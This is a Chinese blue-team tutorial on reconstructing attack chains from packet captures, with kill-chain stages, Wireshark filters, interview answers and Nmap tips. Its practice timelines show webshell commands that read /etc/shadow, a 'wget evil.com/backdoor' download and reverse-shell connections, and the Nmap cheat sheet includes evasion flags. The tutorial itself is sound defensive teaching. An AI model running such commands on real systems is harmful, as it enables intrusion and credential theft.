## 完整攻击链流量分析

前两天的分析集中在"单一攻击行为"——扫描是扫描、SQL注入是SQL注入。
但真实攻击往往是一条"链"——多个步骤串联起来完成入侵。
今天的目标是：从一个PCAP中还原完整的攻击链。

### 经典攻击链的7个阶段

参考Kill Chain模型和ATT&CK框架，完整的攻击链通常包括：

1. **侦察阶段（Reconnaissance）**
   流量特征：端口扫描、路径扫描、服务版本探测
   Wireshark看到：大量SYN包、404响应集群

2. **武器化/投递阶段（Weaponization/Delivery）**
   流量特征：漏洞利用Payload、恶意文件下载
   Wireshark看到：异常的POST请求携带Exploit代码

3. **漏洞利用阶段（Exploitation）**
   流量特征：利用成功后服务器返回了异常响应（如命令执行回显）
   Wireshark看到：响应中包含文件列表、系统信息等不该暴露的数据

4. **安装植入阶段（Installation）**
   流量特征：上传Webshell/Malware、写入SSH密钥
   Wireshark看到：PUT/POST请求上传文件 + 返回201/200

5. **C2通信阶段（Command & Control）**
   流量特征：周期性心跳包、加密通信、DNS隧道
   Wireshark看到：周期性HTTP请求、异常DNS查询

6. **达成目标阶段（Actions on Objectives）**
   流量特征：大量数据外传、数据库查询、横向移动
   Wireshark看到：大量外发数据、内网扫描、SMB/RDP连接

7. **痕迹清除阶段（Defense Evasion）**
   流量特征：日志清除命令、后门隐藏、持久化机制
   Wireshark看到：执行清理命令的请求（如删日志、清history）

## 攻击链还原实操

假设你有下面的PCAP样本，请尝试还原攻击链：

```
时间线（从PCAP中提取）：
t=00:00  192.168.1.100 -> 10.0.0.5:22,80,443,3306,6379 SYN扫描
t=02:30  192.168.1.100 -> 10.0.0.5:80 GET /struts2-showcase/
t=03:15  192.168.1.100 -> 10.0.0.5:80 POST /struts2-showcase/action (Payload含ognl表达式)
t=03:16  10.0.0.5 -> 192.168.1.100 响应中包含 whoami 命令的执行结果: root
t=05:00  192.168.1.100 -> 10.0.0.5:80 POST /struts2-showcase/shell.jsp (上传Webshell)
t=05:30  192.168.1.100 -> 10.0.0.5:80 GET /struts2-showcase/shell.jsp?cmd=id
t=06:00  192.168.1.100 -> 10.0.0.5:80 GET /struts2-showcase/shell.jsp?cmd=cat+/etc/shadow
t=10:00  10.0.0.5 -> 192.168.1.100:4444 TCP连接 (反弹Shell)
```

攻击链还原分析：
1. 第一步扫描（00:00-02:30）：攻击者扫描了常见端口，发现了Struts2应用
2. 第二步漏洞利用（03:15-03:16）：利用Struts2漏洞执行了whoami，确认自己是root
3. 第三步上传Webshell（05:00-06:00）：上传并访问Webshell，读取了/etc/shadow密码文件
4. 第四步建立C2（10:00）：通过反弹Shell获得持久化控制
5. 综合判断：这是一个完整的Struts2入侵攻击链，从扫描到获取持久化控制只用了10分钟

## 流量分析报告模板

完成分析后，你需要输出一份结构化报告：

**1. 样本基本信息**
- PCAP文件名和来源
- 时间范围
- 涉及的IP地址（攻击者IP、受害者IP）
- 总包数和协议分布

**2. 攻击时间线**
- 按时间顺序列出关键事件
- 每个事件标注时间、源IP、目标IP、行为描述

**3. 攻击技术分析**
- 使用了什么漏洞？对应的CVE编号？
- 使用了什么攻击工具？
- 攻击者在每个阶段做了什么？

**4. IOC提取**
- 攻击者IP、C2域名、文件哈希、Payload特征

**5. 检测建议**
- 基于该攻击的WAF规则建议
- 基于该攻击的IDS规则建议
- 日志监控关注点

**6. 防御建议**
- 如何修复被利用的漏洞？
- 如何检测和阻止类似的攻击？
- 是否需要加强某个方面的监控？

## 实战思维训练：流量分析的"肌肉记忆"

### 给你一段流量，你的第一反应应该是什么？

记住这个口诀：**先全局后局部，先统计后细节，先协议后内容**。

具体来说：
1. 打开PCAP -> 先看 Statistics -> Summary 了解概况（时间范围、包数、大小）
2. 再看 Statistics -> Protocol Hierarchy 了解协议分布
3. 再看 Statistics -> Conversations 找出通信最多的IP对
4. 最后才聚焦到具体的数据包内容

很多新手一打开PCAP就钻到具体包里去分析，就像进了森林只看树叶不看地图。
先有全局观，才能知道哪些"树叶"需要仔细看。

### 每日流量分析"10分钟练习"

每天花10分钟，用Wireshark抓自己电脑的流量：
1. 打开Wireshark，选正在用的网卡，开始抓包
2. 过滤 http 或 dns，看看你在浏览什么、解析了什么域名
3. 过滤 ip.dst == 你公司某服务器的IP，看看通信内容
4. 观察正常的流量长什么样，这样你才能识别异常的流量

> 蓝队的核心能力之一：知道"正常"才能发现"异常"。

### 常见攻击流量速查表

| 攻击类型 | 协议层 | Wireshark过滤 | 判断依据 |
|:---|:---|:---|:---|
| 端口扫描 | TCP | tcp.flags.syn==1 && tcp.flags.ack==0 | 大量SYN到不同端口 |
| SQL注入 | HTTP | http contains "UNION SELECT" | 请求中含SQL关键字 |
| XSS攻击 | HTTP | http contains "<script>" | 请求中含HTML/JS标签 |
| 目录爆破 | HTTP | http.response.code==404 | 大量404+不同URI+同一源IP |
| DNS隧道 | DNS | dns.qry.name matches "[a-z0-9]{30,}" | 超长子域名 |
| C2心跳 | HTTP | http.request 按时间排序 | 周期性请求+周期性响应 |
| 文件上传 | HTTP | http.request.method==POST && http contains "multipart" | POST+文件内容 |
| 反弹Shell | TCP | 非标准端口+长连接+交互数据 | 异常端口的交互式TCP |

## 蓝队面试高频题（流量分析方向）

**Q1: 给你一个PCAP文件，你怎么分析？**

标准回答流程：
1. 先用Statistics了解全局（时间范围、包数、协议分布、通信对）
2. 用过滤器聚焦可疑流量（异常端口、异常IP、异常协议）
3. Follow TCP/HTTP Stream查看完整会话内容
4. 提取关键证据（Payload、IOC、时间线）
5. 还原攻击路径，输出分析报告

面试官想听到的是你有方法论，不是瞎看。

**Q2: 怎么区分正常扫描和恶意扫描？**

正常扫描（如搜索引擎爬虫、Shodan）：
- User-Agent真实（Googlebot、Shodan等知名标识）
- IP可查到归属（如Google的IP段）
- 行为收敛（只访问常见端口、请求间隔均匀）

恶意扫描：
- User-Agent伪造或缺失
- IP来自不常见的地区（或VPS/代理IP）
- 行为激进（大量404、多种攻击Payload混在一起）
- 扫描后有后续攻击行为（漏洞利用）

**Q3: C2通信有哪些检测方法？**

1. 时间维度：周期性心跳（间隔固定，如每30秒一次）
2. 内容维度：请求/响应数据经过编码或加密
3. 连接维度：长连接（TCP连接持续数小时）或短连接但极高频
4. 域名维度：连接域名注册时间短、域名随机（DGA特征）
5. 证书维度：TLS证书自签名或异常

最可靠的是综合2个以上维度判断——单一维度容易误判。

**Q4: 遇到HTTPS加密流量怎么分析？**

HTTPS加密后看不到内容，但仍然可以分析：
1. TLS握手信息：SNI（域名）、JA3指纹（客户端特征）
2. 连接元数据：连接时间、包大小、频率、时长
3. DNS解析记录：在TLS连接之前通常有DNS请求，可以看到域名
4. 如果有SSL KEY LOG文件，Wireshark可以解密（仅限测试环境）
5. 企业内部可以部署SSL解密设备（需合规审批）

## 攻击链还原实战框架

### 标准化攻击链还原流程（SOP）

**阶段一：信息收集（5分钟）**
- 打开PCAP -> Statistics -> Summary 记录基本信息
- Protocol Hierarchy 了解协议分布
- Conversations 找出TOP 5通信对
- Endpoints 列出所有IP地址

**阶段二：异常发现（10分钟）**
- 过滤异常端口（非80/443/53的流量）
- 查找可疑关键字（cmd、exec、eval、base64、passwd、shadow）
- 关注大量404/扫描模式
- 标记所有需要深入分析的IP和会话

**阶段三：攻击链拼图（15分钟）**
- 按时间线排列关键事件
- 将事件归类到Kill Chain的7个阶段
- 识别攻击链中的缺失环节（如果时间线不完整）
- 标注攻击是否成功的关键证据

**阶段四：证据提取（10分钟）**
- 导出攻击相关的数据包
- 提取文件（File -> Export Objects）
- 截图关键会话
- 整理IOC列表

**阶段五：报告输出（10分钟）**
- 按模板撰写报告
- 附带证据截图
- 给出检测和防御建议

### 攻击链还原自测

以下是一个简化版的时间线，尝试还原攻击链：

```
时间轴：
T+0s:   192.168.1.50 -> 10.0.0.10 TCP/80 GET /                   正常浏览首页
T+5s:   192.168.1.50 -> 10.0.0.10 TCP/80 GET /admin              404返回
T+8s:   192.168.1.50 -> 10.0.0.10 TCP/80 GET /manager            404返回
T+10s:  192.168.1.50 -> 10.0.0.10 TCP/80 POST /login.php         200登录成功
T+15s:  192.168.1.50 -> 10.0.0.10 TCP/80 POST /upload.php        200上传文件
T+16s:  192.168.1.50 -> 10.0.0.10 TCP/80 GET /uploads/shell.php?cmd=id  200返回uid=33
T+20s:  192.168.1.50 -> 10.0.0.10 TCP/80 GET /uploads/shell.php?cmd=wget+evil.com/backdoor 200
T+25s:  10.0.0.10 -> 45.33.32.156 TCP/4444                       SYN建立连接
T+26s:  10.0.0.10 -> 45.33.32.156 TCP/4444                       数据传输（加密）
```

攻击链分析答案：
1. 侦察：扫描管理路径（/admin, /manager）发现登录页
2. 初始访问：登录成功（可能是弱口令或SQL注入绕过）
3. 执行：上传Webshell（/uploads/shell.php）
4. 持久化：通过wget下载后门程序
5. C2：与45.33.32.156:4444建立连接

结论：攻击者通过弱口令/注入登录后台，上传Webshell，下载持久化后门，建立C2通道。

### 从流量分析到防御加固

分析完攻击链后，应该能给出针对性的防御建议：
1. 登录页加强：验证码 + 登录失败锁定 + 强密码策略
2. 文件上传限制：白名单扩展名 + 内容校验 + 病毒扫描
3. 出站流量控制：限制非业务端口的出站连接
4. 网络分段：Web服务器不应能直接访问外网（走代理）

每次分析一个攻击链，都应该提取出"怎么防"的经验——
这才是蓝队分析攻击流量的最终目的。

## 蓝队日常工具实战汇总

### Nmap快速扫描速查

```
# 快速扫描常用端口
nmap -F target

# 扫描全部65535个端口
nmap -p- target

# 服务版本探测
nmap -sV target

# 操作系统探测
nmap -O target

# 综合扫描（版本+OS+脚本）
nmap -A target

# 躲避防火墙（分段包）
nmap -f target

# 慢速扫描（降低检测风险）
nmap -T2 target
```

### Wireshark显示过滤 vs 捕获过滤

| 类型 | 用法 | 场景 |
|:---|:---|:---|
| 显示过滤 | 抓完包后过滤显示 | 分析已有PCAP |
| 捕获过滤 | 只抓符合条件的数据包 | 实时监控/抓包时减少数据量 |

常用捕获过滤：`port 80 or port 443` `host 192.168.1.1` `not arp`

### BurpSuite蓝队使用要点

蓝队用BurpSuite不攻击，而是：
1. **Proxy模块**：观察正常和异常的HTTP请求差异
2. **Repeater模块**：手动重放可疑请求观察服务器响应
3. **Decoder模块**：解码攻击Payload中的编码内容
4. **Intruder模块**：测试WAF规则是否被正确触发

### 安全日志关键字速查

在ELK中搜索这些关键字快速定位攻击：
- `UNION SELECT` / `OR 1=1` / `information_schema` -> SQL注入
- `<script>` / `onerror=` / `javascript:` -> XSS攻击
- `../` / `..\\` / `passwd` / `shadow` -> 目录遍历/文件包含
- `cmd.exe` / `/bin/bash` / `whoami` / `id` -> 命令执行/Webshell
- `eval(` / `base64_decode` / `system(` -> PHP代码执行

### 蓝队日常巡检脚本示例

```python
# 简单端口监控脚本
import socket
import time

SERVICES = {
    'web': ('10.0.0.1', 80),
    'api': ('10.0.0.2', 8080),
    'db': ('10.0.0.3', 3306),
}

def check_port(name, host, port):
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((host, port))
        s.close()
        return True
    except:
        return False

while True:
    for name, (host, port) in SERVICES.items():
        status = "UP" if check_port(name, host, port) else "DOWN!"
        print(f"[{time.strftime('%H:%M:%S')}] {name}({host}:{port}) -> {status}")
    time.sleep(60)
```
